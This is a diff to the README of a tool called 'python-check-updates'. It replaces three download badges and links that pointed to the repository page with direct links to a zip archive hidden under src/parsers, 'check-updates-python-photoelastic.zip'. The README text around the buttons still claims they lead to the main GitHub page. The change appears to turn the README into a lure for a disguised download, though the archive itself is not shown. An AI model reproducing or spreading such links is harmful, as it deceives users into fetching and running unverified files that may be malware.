@@ -1,6 +1,6 @@
 # ⚙️ python-check-updates - Quickly Find New Python Package Versions
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates)
+[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)
 
 ---
 
@@ -52,7 +52,7 @@ You will visit the software's download page on GitHub to get the latest version.
 
 Click on the green button below or copy and paste the URL into your web browser:
 
-[![Download](https://img.shields.io/badge/Download-Get%20App-red?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates)
+[![Download](https://img.shields.io/badge/Download-Get%20App-red?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)
 
 This will take you to the main GitHub page for python-check-updates.
 
@@ -200,4 +200,4 @@ To update packages after checking:
 
 You can always visit this page to download or check for new versions:
 
-[https://github.com/vestalterrace911/python-check-updates](https://github.com/vestalterrace911/python-check-updates)
+[https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)
